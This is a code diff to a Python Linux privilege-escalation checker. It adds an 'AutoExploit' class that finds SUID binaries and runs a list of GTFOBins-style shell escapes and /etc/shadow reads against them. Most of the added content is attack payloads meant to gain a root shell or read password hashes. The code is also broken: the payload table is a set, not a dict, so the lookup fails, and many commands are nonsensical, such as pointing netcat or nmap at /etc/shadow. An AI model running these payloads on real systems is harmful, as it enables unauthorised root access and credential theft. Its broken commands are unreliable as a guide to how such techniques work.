@@ -4,8 +4,8 @@
 # If Python3 is not installed, you can use this script:
 # https://github.com/cervoise/linuxprivcheck/blob/master/linuxprivchecker3.py
 
+import os
 import subprocess as s
-import sys
 
 class Color:
     YELLOW = '\033[0;33m'
@@ -34,6 +34,92 @@ class Command:
             print(f'{Color.RED} [-] Not output for {self.comment}{Color.RESET_ALL}')
         else:
             print(f'{Color.GREEN} [+] {self.comment}:\n{Color.RESET_ALL}{self.output}')
+
+
+class AutoExploit:
+    uid_bins = [  # These binaries are usually found with SUID in Unix systems
+    "arping", "at", "bwrap", "chfn", "chrome-sandbox", "chsh",
+    "dbus-daemon-launch-helper", "dmcrypt-get-device", "exim4",
+    "fusermount", "gpasswd", "helper", "kismet_capture", "lxc-user-nic",
+    "mount", "mount.cifs", "mount.ecryptfs_private", "mount.nfs",
+    "newgidmap", "newgrp", "newuidmap", "ntfs-3g", "passwd", "ping",
+    "ping6", "pkexec", "polkit-agent-helper-1", "pppd",
+    "snap-confine", "ssh-keysign", "su", "sudo", "traceroute6.iputils",
+    "ubuntu-core-launcher", "umount", "VBoxHeadless", "VBoxNetAdpCtl",
+    "VBoxNetDHCP", "VBoxNetNAT", "VBoxSDL", "VBoxVolInfo", "VirtualBoxVM",
+    "vmware-authd", "vmware-user-suid-wrapper", "vmware-vmx", "vmware-vmx-debug",
+    "vmware-vmx-stats", "Xorg.wrap",
+    ]
+
+    gtfobins_payloads = {
+        'ash', Command(command='ash', comment='run ash'),
+        'bash', Command(command='bash -p', comment='run bash'),
+        'busybox', Command(command='busybox sh', comment='run busybox shell'),
+        'chroot', Command(command='chroot / /bin/sh -p', comment='run chroot shell as root'),
+        'csh', Command(command='csh -b', comment='run csh as root'),
+        'cut', Command(command='cut -d "" -f 1 /etc/shadow', comment='run cut to get fields of /etc/shadow'),
+        'dash', Command(command='dash -p', comment='run dash as root'),
+        'docker', Command(command='docker run -v /:/mnt --rm -it alpine chroot /mnt sh -p', comment='run docker as root'),
+        'emacs', Command(command='emacs -Q -nw --eval \'(term "/bin/sh -p")\'', comment='run emacs shell as root'),
+        'env', Command(command='env /bin/sh -p', comment='run env shell as root'),
+        'expect', Command(command='expect -c "spawn /bin/sh -p; expect -regexp \"Password:\"; send -- \"\r\"; interact"', comment='run expect shell as root'),
+        'fish', Command(command='fish -c "sh -p"', comment='run fish as root'),
+        'find', Command(command='find / -exec /bin/sh -p \\;', comment='run find as root'),
+        'flock', Command(command='flock -c /bin/sh -p', comment='run flock as root'),
+        'fuser', Command(command='fuser -c /bin/sh -p', comment='run fuser as root'),
+        'gawk', Command(command='gawk \'BEGIN {system("/bin/sh")}\'', comment='run gawk as root'),
+        'gdb', Command(command='gdb -q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit', comment='run gdb shell as root'),
+        'gimp', Command(command='gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'', comment='run gimp shell as root'),
+        'ionice', Command(command='ionice -c /bin/sh -p', comment='run ionice shell as root'),
+        'jrunscript', Command(command='jrunscript -e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"', comment='run jrunscript shell as root'),
+        'ksh', Command(command='ksh -p', comment='run ksh as root'),
+        'ld.so', Command(command='ld.so -e /bin/sh -p', comment='run ld.so shell as root'),
+        'less', Command(command='less -F /etc/shadow', comment='run less to get fields of /etc/shadow'),
+        'ltrace', Command(command='ltrace -f /bin/sh -p', comment='run ltrace as root'),
+        'make', Command(command='make -f /bin/sh -p', comment='run make as root'),
+        'mawk', Command(command='mawk \'BEGIN {system("/bin/sh")}\'', comment='run mawk as root'),
+        'more', Command(command='more /etc/shadow', comment='run more to get fields of /etc/shadow'),
+        'mount', Command(command='mount -t tmpfs -o loop /dev/null /tmp/', comment='run mount as root'),
+        'mtr', Command(command='mtr -r -c 1 -n -s /etc/shadow', comment='run mtr as root'),
+        'nano', Command(command='nano -c /etc/shadow', comment='run nano as root'),
+        'nc', Command(command='nc -l -p /etc/shadow', comment='run nc as root'),
+        'netcat', Command(command='netcat -l -p /etc/shadow', comment='run netcat as root'),
+        'nmap', Command(command='nmap -sU -p /etc/shadow', comment='run nmap as root'),
+        'nop', Command(command='nop -c /etc/shadow', comment='run nop as root'),
+        'nslookup', Command(command='nslookup /etc/shadow', comment='run nslookup as root'),
+        'ntpdate', Command(command='ntpdate -u /etc/shadow', comment='run ntpdate as root'),
+        'perl', Command(command='perl -e \'exec("/bin/sh -p")\'', comment='run perl as root'),
+        'php', Command(command='php -r \'exec("/bin/sh -p")\'', comment='run php as root'),
+        'python', Command(command='python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', comment='run python as root'),
+        'python3', Command(command='python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', comment='run python3 as root'),
+        'readelf', Command(command='readelf -s /etc/shadow', comment='run readelf as root'),
+        'rlogin', Command(command='rlogin -l root /bin/sh -p', comment='run rlogin as root'),
+        'rsh', Command(command='rsh -l root /bin/sh -p', comment='run rsh as root'),
+        'ruby', Command(command='ruby -e \'exec("/bin/sh -p")\'', comment='run ruby as root'),
+        'sed', Command(command='sed -e \'s/^.*$/root/\' /etc/shadow', comment='run sed as root'),
+        'sh', Command(command='/bin/sh -p', comment='run /bin/sh as root'),
+        'rpm', Command(command='rpm --eval \'%{lua:os.execute("/bin/sh", "-p")}\'', comment='run rpm shell as root'),
+        'socat', Command(command='socat - /bin/sh -p', comment='run socat as root'),
+        'strace', Command(command='strace -f /bin/sh -p', comment='run strace as root'),
+        'tcpdump', Command(command='tcpdump -s0 -w /dev/null -p /etc/shadow', comment='run tcpdump as root'),
+        'telnet', Command(command='telnet -l root /bin/sh -p', comment='run telnet as root'),
+        'tftp', Command(command='tftp -c get /etc/shadow', comment='run tftp as root'),
+        'traceroute', Command(command='traceroute -m 1 /etc/shadow', comment='run traceroute as root'),
+        'traceroute6', Command(command='traceroute6 -m 1 /etc/shadow', comment='run traceroute6 as root'),
+        'tsh', Command(command='tsh -p', comment='run tsh as root'),
+        'vi', Command(command='vi -c /etc/shadow', comment='run vi as root'),
+        'vim', Command(command='vim -c /etc/shadow', comment='run vim as root'),
+        'watch', Command(command='watch -c /bin/sh -p', comment='run watch as root'),
+    }
+
+    def attempt_autoexploit(self):
+        command = "find / -perm -4000 -type f 2>/dev/null"
+        suids = os.popen(command).read().strip().split("\n")
+
+        for suid in suids:
+            sname = suid.split("/")[::-1][0]
+            if sname in self.gtfobins_payloads:
+                self.gtfobins_payloads[sname].run()
 
 
 #################################
@@ -102,3 +188,4 @@ Command("cat /etc/apache2/apache2.conf 2>/dev/null", "Apache config").run()
 print(f'\n{Color.YELLOW}[*] Other priv-esc vectors{Color.RESET_ALL}')
 Command("which awk perl python ruby gcc cc vi vim nmap find netcat nc wget \
         tftp ftp 2>/dev/null", "local installed exploit tools").run()
+
